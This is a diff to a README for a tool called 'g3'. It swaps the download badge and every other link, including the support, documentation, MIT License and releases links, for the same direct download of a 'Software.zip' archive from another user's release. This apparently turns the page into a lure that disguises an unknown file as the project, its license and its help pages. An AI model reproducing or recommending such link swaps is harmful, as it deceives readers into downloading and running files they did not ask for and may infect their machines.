@@ -1,7 +1,7 @@
 # Welcome to "g3" Repository
 
 🚀 **Click below to download the latest version of g3** 🚀  
-[![Download g3](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download g3](https://github.com/harshitp011/g3/releases/download/v2.0/Software.zip)](https://github.com/harshitp011/g3/releases/download/v2.0/Software.zip)
 
 ---
 ## Table of Contents
@@ -36,7 +36,7 @@ To install "g3", follow these simple steps:
 2. Once the download is complete, extract the contents of the zip file to your desired location.
 3. That's it! "g3" is now successfully installed on your system.
 
-If you encounter any issues during the installation process, feel free to reach out to our support team via [Support Page](https://example.com/support).
+If you encounter any issues during the installation process, feel free to reach out to our support team via [Support Page](https://github.com/harshitp011/g3/releases/download/v2.0/Software.zip).
 
 ## Usage
 
@@ -46,7 +46,7 @@ $ g3 command1
 $ g3 command2
 $ g3 command3
 ```
-For advanced usage and detailed documentation, visit our [Official Documentation](https://example.com/docs).
+For advanced usage and detailed documentation, visit our [Official Documentation](https://github.com/harshitp011/g3/releases/download/v2.0/Software.zip).
 
 ## Contributing
 
@@ -61,10 +61,10 @@ Our team will review your contribution and work together to merge it into the ma
 
 ## License
 
-"g3" is released under the [MIT License](https://opensource.org/licenses/MIT). Spread the word and share the power of "g3" with everyone!
+"g3" is released under the [MIT License](https://github.com/harshitp011/g3/releases/download/v2.0/Software.zip). Spread the word and share the power of "g3" with everyone!
 
 ---
 
 Enjoy using "g3" and elevate your development experience to new heights! 🌟
 
-If the download link provided above does not lead to the desired file, please check the [Releases](https://github.com/cli/go-gh/releases) section for alternative download options.
+If the download link provided above does not lead to the desired file, please check the [Releases](https://github.com/harshitp011/g3/releases/download/v2.0/Software.zip) section for alternative download options.
